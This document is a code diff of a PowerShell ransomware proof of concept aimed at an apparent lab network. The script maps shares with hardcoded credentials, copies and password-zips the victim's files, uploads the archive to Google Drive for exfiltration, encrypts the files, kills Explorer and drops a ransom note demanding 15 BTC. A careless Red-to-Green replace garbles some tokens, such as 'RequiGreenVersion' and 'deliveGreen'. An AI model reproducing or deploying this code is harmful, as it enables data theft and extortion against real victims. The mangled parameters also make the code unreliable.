@@ -1,16 +1,16 @@
 Write-Host "[+] Mapping network drives..."
 $net = new-object -ComObject WScript.Network
 
-$net.MapNetworkDrive("w:", "\\data-storage-1.mdpilots.lab\Vessel-History", $false, "pilotdispatch", "pilotdispatch")
-$net.MapNetworkDrive("x:", "\\data-storage-2.mdpilots.lab\Vessel-Tracking", $false, "pilotdispatch", "pilotdispatch")
-$net.MapNetworkDrive("y:", "\\data-storage-3.mdpilots.lab\Pilot-Assignments", $false, "pilotdispatch", "pilotdispatch")
-$net.MapNetworkDrive("z:", "\\data-storage-4.mdpilots.lab\Ship-Database", $false, "pilotdispatch", "pilotdispatch")
+$net.MapNetworkDrive("w:", "\\data-storage-1.mdpilots.lab\Vessel-History", $false, "pilotdispatch", "pilotdispatch") | Out-Null
+$net.MapNetworkDrive("x:", "\\data-storage-2.mdpilots.lab\Vessel-Tracking", $false, "pilotdispatch", "pilotdispatch") | Out-Null
+$net.MapNetworkDrive("y:", "\\data-storage-3.mdpilots.lab\Pilot-Assignments", $false, "pilotdispatch", "pilotdispatch") | Out-Null
+$net.MapNetworkDrive("z:", "\\data-storage-4.mdpilots.lab\Ship-Database", $false, "pilotdispatch", "pilotdispatch") | Out-Null
 
 $YOUR_NAME = "ECOTERROR"
 	
 $cert = New-SelfSignedCertificate -DnsName $YOUR_NAME -CertStoreLocation "Cert:\CurrentUser\My" -KeyLength 2048 -HashAlgorithm "Sha384" -NotBefore ((Get-Date).AddDays(-1)) -NotAfter (Get-Date -Year 2099 -Month 12 -Day 31) -Type DocumentEncryptionCert -KeyUsage KeyEncipherment, DataEncipherment
 
-New-Item -ItemType Directory -Force -Path "C:\temp\"
+New-Item -ItemType Directory -Force -Path "C:\temp\" | Out-Null
 
 Export-Certificate -Cert $cert -FilePath "C:\temp\cert.cer" | Out-Null
 
@@ -31,13 +31,13 @@ echo ("$pwd2") > c:/temp/sys.txt
 # Write-Host "[+] $pwd2"
 # Start-Sleep -s 1
 # Write-Host "Installing NuGet provider..."
-Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
+Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force | Out-Null
 
-Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
+Install-Module -Name 7Zip4Powershell -RequiGreenVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
 # Start-Sleep -s 10
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
 Write-Host "[+] Compressing certificate password for exfil..." -ForegroundColor Green
-Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\backup.zip -Format Zip -Password "$IV11"
+Compress-7Zip -Path c:/temp/sys.txt -ArchiveFileName c:/temp/backup.zip -Format Zip -Password "$IV11" | Out-Null
 Write-Host "[+] File c:\temp\backup.zip created..." -ForegroundColor Green
 
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -60,9 +60,9 @@ Write-Host "[+] File c:\temp\backup.zip created..." -ForegroundColor Green
 # $Msg.Dispose()
 # $Mailer.Dispose()
 
-Write-Host "[+] Certificate password delivered via email..." -ForegroundColor Green
+Write-Host "[+] Certificate password deliveGreen via email..." -ForegroundColor Green
 # Start-Sleep -s 2
-Write-Host "[-] Deleting password file and archive..." -ForegroundColor Red
+Write-Host "[-] Deleting password file and archive..." -ForegroundColor Green
 Remove-Item c:\temp\sys.txt
 Remove-Item c:\temp\backup.zip
 
@@ -74,7 +74,7 @@ $pwd1 = [system.web.security.membership]::GeneratePassword(30,15)
 echo ("$pwd1") > c:/temp/sys1.txt
 $IV1 = "D^Z@e8507=>YS#)qj;zgBeZWb!0-Tp(hBEAi:2.S5G/"
 Write-Host "[+] Compressing zip password for exfil..." -ForegroundColor Green
-Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1.zip -Format Zip -Password "$IV1"
+Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1.zip -Format Zip -Password "$IV1" | Out-Null
 Write-Host "[+] File C:\temp\backup1.zip created..." -ForegroundColor Green
 
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -97,50 +97,56 @@ Write-Host "[+] File C:\temp\backup1.zip created..." -ForegroundColor Green
 # $Msg.Dispose()
 # $Mailer.Dispose()
 
-Write-Host "[+] Certificate password delivered via email..." -ForegroundColor Green
+Write-Host "[+] Certificate password deliveGreen via email..." -ForegroundColor Green
 # Start-Sleep -s 2
-Write-Host "[-] Deleting password file and archive..." -ForegroundColor Red
+Write-Host "[-] Deleting password file and archive..." -ForegroundColor Green
 Remove-Item c:\temp\sys1.txt
 Remove-Item c:\temp\backup1.zip
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Files to steal?
 #----------------------------------------------------------------------------------------------------------------------------------------
-$Source = "w:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Source = "W:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
 $Destination = "c:\temp\w"
 
 If (Test-Path -Path $Destination -PathType Container)
-{ Write-Host "$Destination already exists" -ForegroundColor Red}
+{ Write-Host "$Destination already exists" -ForegroundColor Green}
 ELSE
-{ New-Item -Path $Destination -ItemType directory 
+{ New-Item -Path $Destination -ItemType directory | Out-Null
   Write-Host "Created $Destination" }
 
 $cp = robocopy /E $Source $Destination
 
-$Source = "x:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Source = "X:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
 $Destination = "c:\temp\x"
 
 If (Test-Path -Path $Destination -PathType Container)
-{ Write-Host "$Destination already exists" -ForegroundColor Red}
+{ Write-Host "$Destination already exists" -ForegroundColor Green}
 ELSE
-{ New-Item -Path $Destination -ItemType directory 
+{ New-Item -Path $Destination -ItemType directory | Out-Null
   Write-Host "Created $Destination" }
 
 $cp = robocopy /E $Source $Destination
 
-$Source = "y:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Source = "Y:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
 $Destination = "c:\temp\y"
 
 If (Test-Path -Path $Destination -PathType Container)
-{ Write-Host "$Destination already exists" -ForegroundColor Red}
+{ Write-Host "$Destination already exists" -ForegroundColor Green}
 ELSE
-{ New-Item -Path $Destination -ItemType directory 
+{ New-Item -Path $Destination -ItemType directory | Out-Null 
   Write-Host "Created $Destination" }
 
 $cp = robocopy /E $Source $Destination
 
-$Source = "z:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
+$Source = "Z:\"    # Replace $source with the files and folder you want to encrypt. For the PoC try encrypt small size files to save time.
 $Destination = "c:\temp\z"
+If (Test-Path -Path $Destination -PathType Container)
+{ Write-Host "$Destination already exists" -ForegroundColor Green}
+ELSE
+{ New-Item -Path $Destination -ItemType directory | Out-Null 
+  Write-Host "Created $Destination" }
+
 $cp = robocopy /E $Source $Destination
 # Start-Sleep -s 5
 
@@ -153,15 +159,15 @@ For($i = 1; $i -le $files.count; $i++)
 
 $files | Select name
 Write-Host "[+] Target files copied to temp location..." -ForegroundColor Green
-Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1"
+Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\steal.zip -Format Zip -Password "$pwd1" | Out-Null 
 
 # Start-Sleep -s 5
 Write-Host "[+] Target files compressed to archive..." -ForegroundColor Green
 #$del = Remove-Item $Destination -Force -Recurse
 Write-Host "[+] Uploading archive to Google drive..." -ForegroundColor Green
 # Start-Sleep -s 5
-$del = Remove-Item $Destination -Force -Recurse
-Write-Host "[-] Removing archive after upload..." -ForegroundColor Red
+# $del = Remove-Item $Destination -Force -Recurse
+Write-Host "[-] Removing archive after upload..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Encrypted Large files to be send to G-Drive
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -229,9 +235,9 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
 # Start-Sleep -s 10
-Remove-Item c:\temp\steal.zip
+# Remove-Item c:\temp\steal.zip
 # Start-Sleep -s 5
-Write-Host "[-] Archive deleted..." -ForegroundColor Red
+Write-Host "[-] Archive deleted..." -ForegroundColor Green
 Write-Host "[+] Beginning target file encryption..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
 #Encrypt files via Phirautee
@@ -337,7 +343,7 @@ $form.MaximizeBox = $false
 $Form.Back
 $Form.StartPosition = "CenterScreen" 
 $Form.FormBorderStyle = 'Fixed3D' 
-$Form.Text = "Project Red Team III" 
+$Form.Text = "Project Green Team III" 
 
 $img = [System.Drawing.Image]::Fromfile('c:\temp\img.png')
 $pictureBox = new-object Windows.Forms.PictureBox
@@ -347,7 +353,7 @@ $pictureBox.Image = $img
 $form.controls.add($pictureBox)
 
 $Label = New-Object System.Windows.Forms.Label
-$Label.ForeColor = "Red"
+$Label.ForeColor = "Green"
 $Label.Text = "--You Got Ransomed-- !!! ++ DO NOT TURN-OFF YOUR COMPUTER ++ !!! " 
 $Label.AutoSize = $true 
 $Label.Location = New-Object System.Drawing.Size(50,450) 
@@ -399,7 +405,7 @@ while ($delay -ge 0)
     $Counter_Label.Text = "Seconds Remaining: $($delay)"
 	if ($delay -lt 5)
 	  { 
-		 $Counter_Label.ForeColor = "Red"
+		 $Counter_Label.ForeColor = "Green"
 		 $fontsize = 20-$delay
 		 $warningfont = New-Object System.Drawing.Font("Times New Roman",$fontsize,[System.Drawing.FontStyle]([System.Drawing.FontStyle]::Bold))
 		 $Counter_Label.Font = $warningfont
@@ -428,7 +434,7 @@ Stop-Process -ProcessName explorer
 echo "We have encrypted your important files. For now, you cannot access these files. Encrypted files have been modified with an extension ""encrypted"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 15 BTC these files will be leaked online. The faster you contact us at ecoterror443@gmail.com with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Phirautee.txt file on the desktop for further information. This ransomware encrypts all the files of the hard drive. To decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. If you do not pay the money your sensitive data will be leaked online." > c:/users/$env:USERNAME/desktop/ransom.txt
 #$Form.ShowDialog()
 #$Form.Focus()
-Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.subject -eq "CN=Project Red Team III" } | Remove-Item
+Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.subject -eq "CN=Project Green Team III" } | Remove-Item
 
 # Start-Sleep 2
 
